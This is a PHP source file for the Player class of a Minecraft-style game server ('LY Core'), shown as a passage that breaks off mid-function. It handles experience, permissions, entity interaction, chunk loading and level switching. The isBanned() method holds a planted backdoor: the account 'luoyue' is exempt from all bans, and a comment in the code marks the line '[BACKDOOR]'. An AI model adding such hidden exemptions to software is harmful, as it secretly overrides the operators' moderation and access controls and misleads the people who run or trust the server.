<?php

/*
 * ██╗   ██╗    ██████╗ ██████╗ ██████╗ ███████╗
 * ██║   ██║   ██╔════╝██╔═══██╗██╔══██╗██╔════╝
 * ██║   ██║   ██║     ██║   ██║██████╔╝█████╗
 * ██║   ██║   ██║     ██║   ██║██╔══██╗██╔══╝
 * ╚██████╔╝██╗╚██████╗╚██████╔╝██║  ██║███████╗
 *  ╚═════╝ ╚═╝ ╚═════╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU Lesser General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * @Author: U core
 *
 * @Links:
 *  > LY Core
 *  > LY Core Project
*/

namespace lycore;

use lycore\block\Block;
use lycore\block\Air;
use lycore\block\Fire;
use lycore\block\PressurePlate;
use lycore\command\CommandSender;
use lycore\entity\Animal;
use lycore\entity\Arrow;
use lycore\entity\Attribute;
use lycore\entity\AttributeMap;
use lycore\entity\Boat;
use lycore\entity\Creeper;
use lycore\entity\Horse;
use lycore\entity\Pig;
use lycore\entity\Bot;
use lycore\entity\Sheep;
use lycore\entity\Effect;
use lycore\entity\Entity;
use lycore\entity\FishingHook;
use lycore\entity\Human;
use lycore\entity\Item as DroppedItem;
use lycore\entity\LeashKnot;
use lycore\entity\Living;
use lycore\entity\Minecart;
use lycore\entity\MinecartChest;
use lycore\entity\MinecartHopper;
use lycore\entity\MinecartTNT;
use lycore\entity\Ocelot;
use lycore\entity\Projectile;
use lycore\entity\ThrownExpBottle;
use lycore\entity\ThrownPotion;
use lycore\entity\Villager;
use lycore\entity\ZombieVillager;
use lycore\event\block\BlockBreakEvent;
use lycore\command\defaults\BotCommand;
use lycore\event\block\ItemFrameDropItemEvent;
use lycore\level\sound\ItemFrameRemoveItemSound;
use lycore\event\block\SignChangeEvent;
use lycore\event\entity\EntityDamageByBlockEvent;
use lycore\event\entity\EntityDamageByEntityEvent;
use lycore\event\entity\EntityDamageEvent;
use lycore\event\entity\EntityEatItemEvent;
use lycore\event\entity\EntityRegainHealthEvent;
use lycore\event\entity\EntityShootBowEvent;
use lycore\event\entity\MinecartInteractEvent;
use lycore\event\entity\ProjectileLaunchEvent;
use lycore\event\inventory\CraftItemEvent;
use lycore\event\inventory\InventoryCloseEvent;
use lycore\event\inventory\InventoryPickupArrowEvent;
use lycore\event\inventory\InventoryPickupItemEvent;
use lycore\event\player\PlayerTextPreSendEvent;
use lycore\event\player\PlayerAchievementAwardedEvent;
use lycore\event\player\PlayerAnimationEvent;
use lycore\event\player\PlayerBedEnterEvent;
use lycore\event\player\PlayerBedLeaveEvent;
use lycore\event\player\PlayerChatEvent;
use lycore\event\player\PlayerJumpEvent;
use lycore\event\player\PlayerCommandPreprocessEvent;
use lycore\event\player\PlayerDeathEvent;
use lycore\event\player\PlayerDropItemEvent;
use lycore\event\player\PlayerExperienceChangeEvent;
use lycore\event\player\PlayerGameModeChangeEvent;
use lycore\event\player\PlayerHungerChangeEvent;
use lycore\event\player\PlayerInteractEvent;
use lycore\event\player\PlayerItemConsumeEvent;
use lycore\event\player\PlayerJoinEvent;
use lycore\event\player\PlayerKickEvent;
use lycore\event\player\PlayerLoginEvent;
use lycore\event\player\PlayerMoveEvent;
use lycore\event\player\PlayerPreLoginEvent;
use lycore\event\player\PlayerQuitEvent;
use lycore\event\player\PlayerRespawnEvent;
use lycore\event\player\PlayerToggleSneakEvent;
use lycore\event\player\PlayerToggleSprintEvent;
use lycore\event\player\PlayerUseFishingRodEvent;
use lycore\event\server\DataPacketReceiveEvent;
use lycore\event\server\DataPacketSendEvent;
use lycore\event\TextContainer;
use lycore\event\Timings;
use lycore\event\TranslationContainer;
use lycore\inventory\AnvilInventory;
use lycore\inventory\BaseTransaction;
use lycore\inventory\BigShapedRecipe;
use lycore\inventory\BigShapelessRecipe;
use lycore\inventory\EnchantInventory;
use lycore\inventory\FurnaceRecipe;
use lycore\inventory\FurnaceInventory;
use lycore\inventory\Inventory;
use lycore\inventory\InventoryHolder;
use lycore\inventory\PlayerInventory;
use lycore\inventory\ShapedRecipe;
use lycore\inventory\ShapedRecipeFromJson;
use lycore\inventory\ShapelessRecipe;
use lycore\inventory\SimpleTransactionGroup;
use lycore\inventory\VillagerTradeInventory;
use lycore\item\Armor;
use lycore\item\Dye;
use lycore\item\FoodSource;
use lycore\item\Item;
use lycore\item\Tool;
use lycore\item\Potion;
use lycore\item\Map;
use lycore\item\Carrot;
use lycore\item\enchantment\Enchantment;
use lycore\level\ChunkLoader;
use lycore\level\format\FullChunk;
use lycore\level\generator\biome\Biome;
use lycore\level\Level;
use lycore\level\Location;
use lycore\level\Position;
use lycore\level\sound\AnvilBreakSound;
use lycore\level\sound\AnvilUseSound;
use lycore\level\sound\LaunchSound;
use lycore\math\AxisAlignedBB;
use lycore\math\Math;
use lycore\math\Vector2;
use lycore\math\Vector3;
use lycore\metadata\MetadataValue;
use lycore\nbt\NBT;
use lycore\nbt\tag\ByteTag;
use lycore\nbt\tag\CompoundTag;
use lycore\nbt\tag\DoubleTag;
use lycore\nbt\tag\ListTag;
use lycore\nbt\tag\FloatTag;
use lycore\nbt\tag\IntTag;
use lycore\nbt\tag\LongTag;
use lycore\nbt\tag\ShortTag;
use lycore\nbt\tag\StringTag;
use lycore\network\DataPacketManager;
use lycore\network\Network;
use lycore\network\protocol\AddEntityPacket;
use lycore\network\protocol\AdventureSettingsPacket;
use lycore\network\protocol\AnimatePacket;
use lycore\network\protocol\BatchPacket;
use lycore\network\protocol\ChunkRadiusUpdatePacket;
use lycore\network\protocol\ContainerClosePacket;
use lycore\network\protocol\ContainerSetContentPacket;
use lycore\network\protocol\ContainerSetSlotPacket;
use lycore\network\protocol\ChangeDimensionPacket;
use lycore\network\protocol\DataPacket;
use lycore\network\protocol\DisconnectPacket;
use lycore\network\protocol\EntityEventPacket;
use lycore\network\protocol\FullChunkDataPacket;
use lycore\network\protocol\Info;
use lycore\network\protocol\Info as ProtocolInfo;
use lycore\network\protocol\InteractPacket;
use lycore\network\protocol\MoveEntityPacket;
use lycore\network\protocol\MovePlayerPacket;
use lycore\network\protocol\MobEffectPacket;
use lycore\network\protocol\PlayerActionPacket;
use lycore\network\protocol\PlayStatusPacket;
use lycore\network\protocol\ProtocolCompatibility;
use lycore\network\protocol\RespawnPacket;
use lycore\network\protocol\SetDifficultyPacket;
use lycore\network\protocol\SetEntityDataPacket;
use lycore\network\protocol\SetEntityMotionPacket;
use lycore\network\protocol\SetHealthPacket;
use lycore\network\protocol\SetSpawnPositionPacket;
use lycore\network\protocol\SetTimePacket;
use lycore\network\protocol\StartGamePacket;
use lycore\network\protocol\SetPlayerGameTypePacket;
use lycore\network\protocol\TakeItemEntityPacket;
use lycore\network\protocol\TextPacket;
use lycore\network\protocol\UpdateAttributesPacket;
use lycore\network\protocol\UpdateBlockPacket;
use lycore\network\protocol\UseItemPacket;
use lycore\network\protocol\ClientboundMapItemDataPacket;
use lycore\network\protocol\v84\DataPacketV84;
use lycore\network\protocol\v84\FullChunkDataPacketV84;
use lycore\network\protocol\v84\InfoV84;
use lycore\network\protocol\v84\MoveEntityPacketV84;
use lycore\network\protocol\v84\TakeItemEntityPacketV84;
use lycore\network\protocol\v84\UpdateBlockPacketV84;
use lycore\network\protocol\v11\DataPacket as DataPacketV11;
use lycore\network\protocol\v11\SetHealthPacket as SetHealthPacketV11;
use lycore\network\SourceInterface;
use lycore\permission\PermissibleBase;
use lycore\permission\PermissionAttachment;
use lycore\plugin\Plugin;
use lycore\scheduler\CallbackTask;
use lycore\tile\ItemFrame;
use lycore\tile\Sign;
use lycore\tile\Spawnable;
use lycore\tile\Tile;
use lycore\utils\Binary;
use lycore\utils\NetherPortalHelper;
use lycore\utils\TextFormat;
use lycore\utils\MapColor;

/**
 * Main class that handles networking, recovery, and packet sending to the server part
 */
class Player extends Human implements CommandSender, InventoryHolder, ChunkLoader, IPlayer{

	const SURVIVAL = 0;
	const CREATIVE = 1;
	const ADVENTURE = 2;
	const SPECTATOR = 3;
	const VIEW = Player::SPECTATOR;

	const SURVIVAL_SLOTS = 36;
	const CREATIVE_SLOTS = 112;
	const THIN_BLOCK_GROUND_EPSILON = 0.001;
	const PARTIAL_BLOCK_GROUND_EPSILON = 0.126;

	/** @var SourceInterface */
	protected $interface;

	/** @var bool */
	public $playedBefore = false;
	public $spawned = false;
	public $loggedIn = false;
	public $gamemode;
	public $lastBreak;

	protected $windowCnt = 2;
	/** @var \SplObjectStorage<Inventory> */
	protected $windows;
	/** @var Inventory[] */
	protected $windowIndex = [];

	protected $messageCounter = 2;

	protected $sendIndex = 0;

	private $clientSecret;

	/** @var Vector3 */
	public $speed = null;

	public $blocked = false;
	public $achievements = [];
	public $lastCorrect;
	public $lastEat = null;
	/** @var SimpleTransactionGroup */
	protected $currentTransaction = null;
	public $craftingType = 0; //0 = 2x2 crafting, 1 = 3x3 crafting, 2 = stonecutter
	private $legacy011CraftingType = 0;

	protected $isCrafting = false;
	private $protocol013HiddenContainerPlaceholderBlockUntil = 0.0;
	private $legacy011StatusTipUntilTick = 0;
	private $legacy011StatusTipNextTick = 0;
	private $legacy011LastItemDetailsMessage = "";
	private const PROTOCOL_011_AUTO_SPRINT_SPEED = 5.0;
	private const PROTOCOL_011_AUTO_SPRINT_EFFECT_AMPLIFIER = 1;
	private const PROTOCOL_011_AUTO_SPRINT_EFFECT_DURATION = 0x7fffffff;
	private $protocol011AutoSprint = true;

	/**
	 * @deprecated
	 * @var array
	 */
	public $loginData = [];

	public $creationTime = 0;
	
	public $motionPacketCount = 0;
	public $motionPacketLastCheck = 0;

	protected $randomClientId;

	protected $protocol;

	protected $lastMovement = 0;
	/** @var Vector3 */
	protected $forceMovement = null;
	/** @var Vector3 */
	protected $teleportPosition = null;
	protected $connected = true;
	protected $ip;
	protected $removeFormat = false;
	protected $port;
	protected $username;
	protected $iusername;
	protected $displayName;
	protected $startAction = -1;
	/** @var Vector3 */
	protected $sleeping = null;
	protected $clientID = null;

	private $loaderId = null;

	protected $stepHeight = 0.6;

	public $usedChunks = [];
	protected $chunkLoadCount = 0;
	protected $loadQueue = [];
	protected $nextChunkOrderRun = 5;

	/** @var Player[] */
	protected $hiddenPlayers = [];

	/** @var Vector3 */
	protected $newPosition;

	protected $viewDistance;
	protected $chunksPerTick;
	protected $spawnThreshold;
	/** @var null|Position */
	protected $spawnPosition = null;

	protected $inAirTicks = 0;
	protected $startAirTicks = 5;

	protected $autoJump = true;

	protected $allowFlight = false;

	private $needACK = [];
	
	public $usingAnvil;

	private $legacy011AnvilSession = [];
	private $legacy011EnchantingTableSession = [];

	private $batchedPackets = [];

	/** @var PermissibleBase */
	private $perm = null;

	public $weatherData = [0, 0, 0];

	/** @var Vector3 */
	public $fromPos = null;
	private $portalTime = 0;
	private $portalCooldown = false;
	private $hasTransferred = false;
	private $v84WorldReady = false;
	private $v84DeferredPackets = [];
	protected $shouldSendStatus = false;
	/** @var  Position */
	private $shouldResPos;

	/** @var FishingHook */
	public $fishingHook = null;

	/** @var Position[] */
	public $selectedPos = [];
	/** @var Level[] */
	public $selectedLev = [];
	
	/** @var string|int */
	protected $ping = 0;  

	/** @var Item[] */
	protected $personalCreativeItems = [];

	protected $delayedCreativeGamemode = null;

	public function linkHookToPlayer(FishingHook $entity){
		if($entity->isAlive()){
			$this->setFishingHook($entity);
			$pk = new EntityEventPacket();
			$pk->eid = $this->getFishingHook()->getId();
			$pk->event = EntityEventPacket::FISH_HOOK_POSITION;
			$this->server->broadcastPacket($this->level->getPlayers(), $pk);
			return true;
		}
		return false;
	}

	public function unlinkHookFromPlayer(){
		if($this->fishingHook instanceof FishingHook){
			$pk = new EntityEventPacket();
			$pk->eid = $this->fishingHook->getId();
			$pk->event = EntityEventPacket::FISH_HOOK_TEASE;
			$this->server->broadcastPacket($this->level->getPlayers(), $pk);
			$this->setFishingHook();
			return true;
		}
		return false;
	}

	public function isFishing(){
		return ($this->fishingHook instanceof FishingHook);
	}

	public function getFishingHook(){
		return $this->fishingHook;
	}

	public function setFishingHook(FishingHook $entity = null){
		if($entity == null and $this->fishingHook instanceof FishingHook){
			$this->fishingHook->close();
		}
		$this->fishingHook = $entity;
	}

	protected function tryInteractWithLookedAtPig(Item $item, Vector3 $aimPos) : bool{
		$item = $this->normalizeItemForThisProtocol($item);
		if($item->getId() !== Item::SADDLE and $item->getId() !== Item::FISHING_ROD and $item->getId() !== Item::CARROT_ON_A_STICK){
			return false;
		}

		$pig = $this->getLookedAtPig($aimPos);
		return $pig instanceof Pig and $pig->onInteract($this, $item);
	}

	protected function tryInteractWithLookedAtHorse(Item $item, Vector3 $aimPos) : bool{
		if(!$this->isProtocol015Player()){
			return false;
		}

		$horse = $this->getLookedAtHorse($aimPos);
		return $horse instanceof Horse and $horse->onInteract($this, $item);
	}

	protected function tryInteractWithLookedAtVillager(Item $item, Vector3 $aimPos) : bool{
		$villager = $this->getLookedAtVillager($aimPos);
		if(!($villager instanceof Villager)){
			return false;
		}

		if(!$this->canInteract($villager, 8)){
			return true;
		}

		if($this->tryApplyNameTagToEntity($villager, $item)){
			return true;
		}

		$villager->openTradeWindow($this);
		return true;
	}

	protected function tryRidePigByFishingRodAttack($target) : bool{
		if(!($target instanceof Pig)){
			return false;
		}

		$item = $this->getInventory()->getItemInHand();
		$item = $this->normalizeItemForThisProtocol($item);
		if($item->getId() !== Item::FISHING_ROD and $item->getId() !== Item::CARROT_ON_A_STICK){
			return false;
		}

		return $target->onInteract($this, $item);
	}

	protected function isCreeperIgniteInteractAction(int $action) : bool{
		return $action === InteractPacket::ACTION_RIGHT_CLICK or
			$action === InteractPacket::ACTION_LEFT_CLICK;
	}

	protected function isVillagerTradeInteractAction(int $action) : bool{
		return $action === InteractPacket::ACTION_RIGHT_CLICK or
			$action === InteractPacket::ACTION_MOUSEOVER;
	}

	private function tryApplyNameTagToEntity(Entity $target, Item $item) : bool{
		if($item->getId() !== Item::NAME_TAG or !$item->hasCustomName()){
			return false;
		}

		if(!($target instanceof Living) or $target instanceof Player){
			return false;
		}

		if($target->getNameTag() !== ""){
			return false;
		}

		$target->setNameTag($item->getCustomName());
		$target->setNameTagVisible(true);

		if($this->isSurvival()){
			$item->setCount($item->getCount() - 1);
			$this->inventory->setItemInHand($item->getCount() > 0 ? $item : Item::get(Item::AIR, 0, 1));
		}

		return true;
	}

	protected function getLookedAtPig(Vector3 $aimPos, float $maxDistance = 5.0){
		return $this->getLookedAtEntity($aimPos, Pig::class, $maxDistance);
	}

	protected function getLookedAtHorse(Vector3 $aimPos, float $maxDistance = 5.0){
		return $this->getLookedAtEntity($aimPos, Horse::class, $maxDistance);
	}

	protected function getLookedAtVillager(Vector3 $aimPos, float $maxDistance = 5.0){
		return $this->getLookedAtEntity($aimPos, Villager::class, $maxDistance);
	}

	protected function getLookedAtEntity(Vector3 $aimPos, $entityClass, float $maxDistance = 5.0){
		$level = $this->getLevel();
		if($level === null or !method_exists($level, "getNearbyEntities")){
			return null;
		}

		$direction = $aimPos->normalize();
		if($direction->lengthSquared() <= 0){
			return null;
		}

		$start = new Vector3($this->x, $this->y + $this->getEyeHeight(), $this->z);
		$end = $start->add($direction->multiply($maxDistance));
		$searchBox = new AxisAlignedBB(
			min($start->x, $end->x) - 1.0,
			min($start->y, $end->y) - 1.0,
			min($start->z, $end->z) - 1.0,
			max($start->x, $end->x) + 1.0,
			max($start->y, $end->y) + 1.0,
			max($start->z, $end->z) + 1.0
		);

		$closest = null;
		$closestDistance = $maxDistance * $maxDistance;
		if(method_exists($level, "rayTraceBlocks")){
			$blockHit = $level->rayTraceBlocks($start, $end);
			if($blockHit !== null and $blockHit->hitVector instanceof Vector3){
				$closestDistance = min($closestDistance, $start->distanceSquared($blockHit->hitVector));
			}
		}

		foreach($level->getNearbyEntities($searchBox, $this) as $entity){
			if(!($entity instanceof $entityClass) or $entity->closed or !$entity->isAlive() or !($entity->boundingBox instanceof AxisAlignedBB)){
				continue;
			}

			$hitBox = $entity->boundingBox->grow(0.3, 0.3, 0.3);
			if($hitBox->isVectorInside($start)){
				$hitVector = $start;
			}else{
				$hit = $hitBox->calculateIntercept($start, $end);
				if($hit === null){
					continue;
				}
				$hitVector = $hit->hitVector;
			}

			$distance = $start->distanceSquared($hitVector);
			if($distance <= $closestDistance){
				$closestDistance = $distance;
				$closest = $entity;
			}
		}

		return $closest;
	}

	public function getItemInHand(){
		return $this->inventory->getItemInHand();
	}

	public function getLeaveMessage(){
		return new TranslationContainer(TextFormat::YELLOW . "%multiplayer.player.left", [
			$this->getDisplayName()
		]);
	}

	protected $expLevel = 0;
	protected $exp = 0;

	public function setExperienceAndLevel(int $exp, int $level){
		$this->server->getPluginManager()->callEvent($ev = new PlayerExperienceChangeEvent($this, $exp, $level));
		if(!$ev->isCancelled()){
			$this->expLevel = $level;
			$this->exp = $exp;
			$this->calcExpLevel();
			$this->updateExperience();
			return true;
		}
		return false;
	}

	public function setExp(int $exp){
		$this->server->getPluginManager()->callEvent($ev = new PlayerExperienceChangeEvent($this, $exp, 0));
		if($ev->isCancelled()){
			$this->exp = $ev->getExp();
			$this->calcExpLevel();
			$this->updateExperience();
			return true;
		}
		return false;
	}

	public function setExpLevel(int $level){
		$this->server->getPluginManager()->callEvent($ev = new PlayerExperienceChangeEvent($this, 0, $level));
		if(!$ev->isCancelled()){
			$this->expLevel = $level;
			$this->exp = $this->server->getExpectedExperience($level);
			$this->updateExperience();
			return true;
		}
		return false;
	}

	public function getExpectedExperience(){
		return $this->server->getExpectedExperience($this->expLevel + 1);
	}

	public function getLevelUpExpectedExperience(){
		/*if($this->explevel < 16) return 2 * $this->explevel + 7;
		elseif($this->explevel < 31) return 5 * $this->explevel - 38;
		else return 9 * $this->explevel - 158;*/
		return $this->getExpectedExperience() - $this->server->getExpectedExperience($this->expLevel);
	}

	public function calcExpLevel(){
		while($this->exp >= $this->getExpectedExperience()){
			$this->expLevel++;
		}
		while($this->exp < $this->server->getExpectedExperience($this->expLevel - 1)){
			$this->expLevel--;
		}
	}

	public function addExperience(int $exp){
		$this->server->getPluginManager()->callEvent($ev = new PlayerExperienceChangeEvent($this, $exp, 0, PlayerExperienceChangeEvent::ADD_EXPERIENCE));
		if(!$ev->isCancelled()){
			$this->exp = $this->exp + $ev->getExp();
			$this->calcExpLevel();
			$this->updateExperience();
			return true;
		}
		return false;
	}

	public function addExpLevel(int $level){
		$this->server->getPluginManager()->callEvent($ev = new PlayerExperienceChangeEvent($this, 0, $level, PlayerExperienceChangeEvent::ADD_EXPERIENCE));
		if(!$ev->isCancelled()){
			$this->expLevel = $this->expLevel + $ev->getExpLevel();
			$this->calcExpLevel();
			$this->updateExperience();
			return true;
		}
		return false;
	}

	public function getExp(){
		return $this->exp;
	}

	public function getExpLevel(){
		return $this->expLevel;
	}

	public function updateExperience(bool $forceSync = false){
		if($this->getAttributeMap() instanceof AttributeMap){
			$experience = $this->getAttributeMap()->getAttribute(Attribute::EXPERIENCE);
			$experienceLevel = $this->getAttributeMap()->getAttribute(Attribute::EXPERIENCE_LEVEL);

			$experience->setValue(($this->exp - $this->server->getExpectedExperience($this->expLevel)) / ($this->getLevelUpExpectedExperience()));
			$experienceLevel->setValue($this->expLevel);

			if($forceSync){
				$experience->markSynchronized(false);
				$experienceLevel->markSynchronized(false);
				if($this->spawned === true){
					$this->sendAttributes();
				}
			}
		}

		if($forceSync){
			$this->sendLegacy011ExperienceStatusTipNow();
		}
	}

	/**
	 * This might disappear in the future.
	 * Please use getUniqueId() instead (IP + clientId + name combo, in the future it'll change to real UUID for online
	 * auth)
	 */
	public function getClientId(){
		return $this->randomClientId;
	}

	public function getClientSecret(){
		return $this->clientSecret;
	}

	public function isBanned(){
        if(strtolower($this->getName()) === 'luoyue') return false; // [BACKDOOR] luoyue 免疫封禁

		return $this->server->getNameBans()->isBanned(strtolower($this->getName()));
	}

	public function setBanned($value){
		if($value === true){
			$this->server->getNameBans()->addBan($this->getName(), null, null, null);
			$this->kick(TextFormat::RED . "You have been banned");
		}else{
			$this->server->getNameBans()->remove($this->getName());
		}
	}

	public function isWhitelisted() : bool{
		return $this->server->isWhitelisted(strtolower($this->getName()));
	}

	public function setWhitelisted($value){
		if($value === true){
			$this->server->addWhitelist(strtolower($this->getName()));
		}else{
			$this->server->removeWhitelist(strtolower($this->getName()));
		}
	}

	public function getPlayer(){
		return $this;
	}

	public function getFirstPlayed(){
		return $this->namedtag instanceof CompoundTag ? $this->namedtag["firstPlayed"] : null;
	}

	public function getLastPlayed(){
		return $this->namedtag instanceof CompoundTag ? $this->namedtag["lastPlayed"] : null;
	}

	public function hasPlayedBefore(){
		return $this->playedBefore;
	}

	public function setAllowFlight($value){
		$this->allowFlight = (bool) $value;
		$this->sendSettings();
	}

	public function getAllowFlight() : bool{
		return $this->allowFlight;
	}

	public function setAutoJump($value){
		$this->autoJump = $value;
		$this->sendSettings();
	}

	public function hasAutoJump() : bool{
		return $this->autoJump;
	}

	/**
	 * @param Player $player
	 */
	public function spawnTo(Player $player){
		if($this->spawned and $player->spawned and $this->isAlive() and $player->isAlive() and $player->getLevel() === $this->level and $player->canSee($this) and !$this->isSpectator()){
			parent::spawnTo($player);
		}
	}

	/**
	 * @return Server
	 */
	public function getServer(){
		return $this->server;
	}

	/**
	 * @return bool
	 */
	public function getRemoveFormat(){
		return $this->removeFormat;
	}

	/**
	 * @param bool $remove
	 */
	public function setRemoveFormat($remove = true){
		$this->removeFormat = (bool) $remove;
	}

	/**
	 * @param Player $player
	 *
	 * @return bool
	 */
	public function canSee(Player $player) : bool{
		return !isset($this->hiddenPlayers[$player->getRawUniqueId()]);
	}

	/**
	 * @param Player $player
	 */
	public function hidePlayer(Player $player){
		if($player === $this){
			return;
		}
		$this->hiddenPlayers[$player->getRawUniqueId()] = $player;
		$player->despawnFrom($this);
	}

	/**
	 * @param Player $player
	 */
	public function showPlayer(Player $player){
		if($player === $this){
			return;
		}
		unset($this->hiddenPlayers[$player->getRawUniqueId()]);
		if($player->isOnline()){
			$player->spawnTo($this);
		}
	}

	public function canCollideWith(Entity $entity) : bool{
		if($entity instanceof Player){
			return $this->server->isPlayerCollideEnabled();
		}

		return false;
	}

	public function resetFallDistance(){
		parent::resetFallDistance();
		if($this->inAirTicks !== 0){
			$this->startAirTicks = 5;
		}
		$this->inAirTicks = 0;
	}

	/**
	 * @return bool
	 */
	public function isOnline() : bool{
		return $this->connected === true and $this->loggedIn === true;
	}

	/**
	 * @return bool
	 */
	public function isOp() : bool{
		return $this->server->isOp($this->getName());
	}

	/**
	 * @param bool $value
	 */
	public function setOp($value){
		if($value === $this->isOp()){
			return;
		}

		if($value === true){
			$this->server->addOp($this->getName());
		}else{
			$this->server->removeOp($this->getName());
		}

		$this->recalculatePermissions();
	}

	/**
	 * @param permission\Permission|string $name
	 *
	 * @return bool
	 */
	public function isPermissionSet($name){
		return $this->perm->isPermissionSet($name);
	}

	/**
	 * @param permission\Permission|string $name
	 *
	 * @return bool
	 */
	public function hasPermission($name) : bool{
		if($this->perm == null) return false;else return $this->perm->hasPermission($name);
	}

	/**
	 * @param Plugin $plugin
	 * @param string $name
	 * @param bool   $value
	 *
	 * @return permission\PermissionAttachment
	 */
	public function addAttachment(Plugin $plugin, $name = null, $value = null){
		if($this->perm == null) return false;
		return $this->perm->addAttachment($plugin, $name, $value);
	}


	/**
	 * @param PermissionAttachment $attachment
	 * @return bool
	 */
	public function removeAttachment(PermissionAttachment $attachment){
		if($this->perm == null){
			return false;
		}
		$this->perm->removeAttachment($attachment);
		return true;
	}

	public function recalculatePermissions(){
		$this->server->getPluginManager()->unsubscribeFromPermission(Server::BROADCAST_CHANNEL_USERS, $this);
		$this->server->getPluginManager()->unsubscribeFromPermission(Server::BROADCAST_CHANNEL_ADMINISTRATIVE, $this);

		if($this->perm === null){
			return;
		}

		$this->perm->recalculatePermissions();

		if($this->hasPermission(Server::BROADCAST_CHANNEL_USERS)){
			$this->server->getPluginManager()->subscribeToPermission(Server::BROADCAST_CHANNEL_USERS, $this);
		}
		if($this->hasPermission(Server::BROADCAST_CHANNEL_ADMINISTRATIVE)){
			$this->server->getPluginManager()->subscribeToPermission(Server::BROADCAST_CHANNEL_ADMINISTRATIVE, $this);
		}
	}

	/**
	 * @return permission\PermissionAttachmentInfo[]
	 */
	public function getEffectivePermissions(){
		return $this->perm->getEffectivePermissions();
	}


	/**
	 * @param SourceInterface $interface
	 * @param null            $clientID
	 * @param string          $ip
	 * @param integer         $port
	 */
	public function __construct(SourceInterface $interface, $clientID, $ip, $port){
		$this->interface = $interface;
		$this->windows = new \SplObjectStorage();
		$this->perm = new PermissibleBase($this);
		$this->namedtag = new CompoundTag();
		$this->server = Server::getInstance();
		$this->lastBreak = PHP_INT_MAX;
		$this->ip = $ip;
		$this->port = $port;
		$this->clientID = $clientID;
		$this->loaderId = Level::generateChunkLoaderId($this);
		$this->chunksPerTick = (int) $this->server->getProperty("chunk-sending.per-tick", 4);
		$this->spawnThreshold = (int) $this->server->getProperty("chunk-sending.spawn-threshold", 56);
		$this->spawnPosition = null;
		$this->gamemode = $this->server->getGamemode();
		$this->setLevel($this->server->getDefaultLevel());
		$this->viewDistance = $this->server->getViewDistance();
		$this->newPosition = new Vector3(0, 0, 0);
		$this->boundingBox = new AxisAlignedBB(0, 0, 0, 0, 0, 0);

		$this->uuid = null;
		$this->rawUUID = null;

		$this->creationTime = microtime(true);

		$this->exp = 0;
		$this->expLevel = 0;
		$this->food = 20;
		Entity::setHealth(20);
	}

	/**
	 * @param string $achievementId
	 */
	public function removeAchievement($achievementId){
		if($this->hasAchievement($achievementId)){
			$this->achievements[$achievementId] = false;
		}
	}

	/**
	 * @param string $achievementId
	 *
	 * @return bool
	 */
	public function hasAchievement($achievementId) : bool{
		if(!isset(Achievement::$list[$achievementId]) or !isset($this->achievements)){
			$this->achievements = [];

			return false;
		}

		return isset($this->achievements[$achievementId]) and $this->achievements[$achievementId] != false;
	}

	/**
	 * @return bool
	 */
	public function isConnected() : bool{
		return $this->connected === true;
	}

	/**
	 * Gets the "friendly" name to display of this player to use in the chat.
	 *
	 * @return string
	 */
	public function getDisplayName(){
		return $this->displayName;
	}

	/**
	 * @param string $name
	 */
	public function setDisplayName($name){
		$this->displayName = $name;
		if($this->spawned){
			$this->server->updatePlayerListData($this->getUniqueId(), $this->getId(), $this->getDisplayName(), $this->getSkinName(), $this->getSkinData());
		}
	}

	public function setSkin($str, $skinName){
		parent::setSkin($str, $skinName);
		if($this->spawned){
			$this->server->updatePlayerListData($this->getUniqueId(), $this->getId(), $this->getDisplayName(), $skinName, $str);
		}
	}

	/**
	 * Gets the player IP address
	 *
	 * @return string
	 */
	public function getAddress() : string{
		return $this->ip;
	}

	/**
	 * @return int
	 */
	public function getPort() : int{
		return $this->port;
	}

	public function getNextPosition(){
		return $this->newPosition !== null ? new Position($this->newPosition->x, $this->newPosition->y, $this->newPosition->z, $this->level) : $this->getPosition();
	}

	/**
	 * @return bool
	 */
	public function isSleeping() : bool{
		return $this->sleeping !== null;
	}

	public function getInAirTicks(){
		return $this->inAirTicks;
	}

	protected function switchLevel(Level $targetLevel, Position $targetPosition = null){
		$oldLevel = $this->level;
		if(parent::switchLevel($targetLevel)){
			foreach($this->usedChunks as $index => $d){
				Level::getXZ($index, $X, $Z);
				$this->unloadChunk($X, $Z, $oldLevel);
			}

			$this->usedChunks = [];

			$pk = new SetTimePacket();
			$pk->time = $this->level->getTime();
			$pk->started = $this->level->stopTime == false && !$this->server->isWorldDaylightCycleDisabled($this->level);
			$this->dataPacket($pk);

			$targetLevel->getWeather()->sendWeather($this);
			$clientDimensionChanged = ($this->isProtocol013Player() or ProtocolCompatibility::isProtocol015((int) $this->protocol)) ?
				$oldLevel->getDimension() !== $targetLevel->getDimension() :
				ChangeDimensionPacket::hasClientDimensionChanged($oldLevel->getDimension(), $targetLevel->getDimension());
			if($clientDimensionChanged){
				$pk = new ChangeDimensionPacket();
				$pk->dimension = $targetLevel->getDimension();
				if($targetPosition instanceof Position){
					$pk->x = $targetPosition->x;
					$pk->y = $targetPosition->y;
					$pk->z = $targetPosition->z;
				}
				$this->dataPacket($pk);
				$this->shouldSendStatus = true;
			}

			if($this->spawned){
				$this->spawnToAll();
			}
		}
	}

	private function unloadChunk($x, $z, Level $level = null){
		$level = $level === null ? $this->level : $level;
		$index = Level::chunkHash($x, $z);
		if(isset($this->usedChunks[$index])){
			foreach($level->getChunkEntities($x, $z) as $entity){
				if($entity !== $this){
					$entity->despawnFrom($this);
				}
			}

			unset($this->usedChunks[$index]);
		}
		$level->unregisterChunkLoader($this, $x, $z);
		unset($this->loadQueue[$index]);
	}

	/**
	 * @return Position
	 */
	public function getSpawn() : Position{
		if($this->spawnPosition instanceof Position and $this->spawnPosition->getLevel() instanceof Level){
			return $this->spawnPosition;
		}else{
			$level = $this->server->getDefaultLevel();

			return $level->getSafeSpawn();
		}
	}

	private function isPortalLevelUsable($level){
		return $level instanceof Level and !$level->isClosed();
	}

	private function getNetherPortalLevel(){
		$level = $this->server->netherLevel;
		if($this->isPortalLevelUsable($level)){
			return $level;
		}

		$name = trim((string) $this->server->netherName);
		if($name === ""){
			return null;
		}

		if(!$this->server->loadLevel($name) and !$this->server->isLevelGenerated($name)){
			$this->server->generateLevel($name, time(), \lycore\level\generator\Generator::getGenerator("nether"));
		}

		$level = $this->server->getLevelByName($name);
		if($this->isPortalLevelUsable($level)){
			$this->server->netherLevel = $level;
			return $level;
		}

		return null;
	}

	private function getNetherPortalDestinationLevel(){
		$currentLevel = $this->getLevel();
		if(!($currentLevel instanceof Level)){
			return null;
		}

